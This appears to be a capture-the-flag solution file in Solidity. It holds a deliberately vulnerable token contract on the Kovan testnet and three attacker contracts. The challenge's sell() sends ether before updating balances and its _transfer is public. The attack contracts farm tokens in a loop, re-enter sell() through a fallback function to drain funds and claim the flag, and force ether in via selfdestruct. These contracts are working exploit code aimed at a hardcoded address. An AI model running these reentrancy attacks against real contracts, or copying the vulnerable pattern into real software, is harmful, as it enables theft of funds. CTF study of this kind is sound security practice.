/**
 *Submitted for verification at Etherscan.io on 2019-09-07
*/

/**
 *Submitted for verification at Etherscan.io on 2019-05-31
*/

kovan@@0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0

pragma solidity ^0.4.25;

contract owned {
    address public owner;

    constructor () 
        public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(
        address newOwner
        ) public 
        onlyOwner {
        owner = newOwner;
    }
}

contract challenge is owned{
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => uint256) public sellTimes;
    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => bool) public winner;

    event Transfer(address _from, address _to, uint256 _value);
    event Burn(address _from, uint256 _value);
    event Win(address _address,bool _win);


    constructor (
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    function _transfer(address _from, address _to, uint _value) public {
        require(_to != address(0x0));
        require(_value > 0);
        
        uint256 oldFromBalance = balanceOf[_from];
        uint256 oldToBalance = balanceOf[_to];
        
        uint256 newFromBalance =  balanceOf[_from] - _value;
        uint256 newToBalance =  balanceOf[_to] + _value;
        
        require(oldFromBalance >= _value);
        require(newToBalance > oldToBalance);
        
        balanceOf[_from] = newFromBalance;
        balanceOf[_to] = newToBalance;
        
        assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance));
        emit Transfer(_from, _to, _value);
    }

    function transfer(address _to, uint256 _value) 
        public 
        returns (bool success) {
        _transfer(msg.sender, _to, _value); 
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) 
        public 
        returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);    
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) 
        public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }
    
    function burn(uint256 _value) 
        public 
        returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        balanceOf[msg.sender] -= _value;
        totalSupply -= _value;          
        emit Burn(msg.sender, _value);
        return true;
    }
    
    function balanceOf(address _address) public view returns (uint256 balance) {
        return balanceOf[_address];
    }
    
    function buy() 
        payable 
        public 
        returns (bool success){
        require(balanceOf[msg.sender]==0);
        require(msg.value == 1 wei);
        _transfer(address(this), msg.sender, 1);
        sellTimes[msg.sender] = 1;
        return true;
    }
    
    
    function sell(uint256 _amount) 
        public 
        returns (bool success){
        require(_amount >= 100);
        require(sellTimes[msg.sender] > 0);
        require(balanceOf[msg.sender] >= _amount);
        require(address(this).balance >= _amount);
        msg.sender.call.value(_amount)();
        _transfer(msg.sender, address(this), _amount);
        sellTimes[msg.sender] -= 1;
        return true;
    }
    
    function winnerSubmit() 
        public 
        returns (bool success){
        require(winner[msg.sender] == false);
        require(sellTimes[msg.sender] > 100);
        winner[msg.sender] = true;
        emit Win(msg.sender,true);
        return true;
    }
    
    function kill(address _address) 
        public 
        onlyOwner {
        selfdestruct(_address);
    }
    
    function eth_balance() 
        public view
        returns (uint256 ethBalance){
        return address(this).balance;
    }
    
}

contract collectmoney{
    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
    address public reentry;
    
    function () payable {
    }
    
    function set_reentry(address target)
    {
        reentry=target;
    }
    
    function exploit(uint times)
    {
        for (uint i=0;i<times;i++)
        {
            challenge(addr).buy.value(1)();
            challenge(addr).transfer(reentry,1);
        }
    }
    
}

contract reentrancy{
    address addr=0xE2d6d8808087D2e30EAdF0ACb67708148dbee0C0;
    uint have_withdraw;
    
    function attack_buy(){
        challenge(addr).buy.value(1)();
    }
    
    function attack(){
        challenge(addr).sell(100);
    }
    
    function () payable {
        if (have_withdraw==0 && msg.sender==addr){
            have_withdraw=1;
            challenge(addr).sell(100);
        }
    }
    
    function getflag() public{
        challenge(addr).winnerSubmit();
    }
}

contract transfer_force{
    
    address owner;
    
    function () payable {
    }
    
    constructor()public{
        owner = msg.sender;
    }
    
    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }
    
    function kill(address to) public onlyOwner {
        selfdestruct(to);
    }
}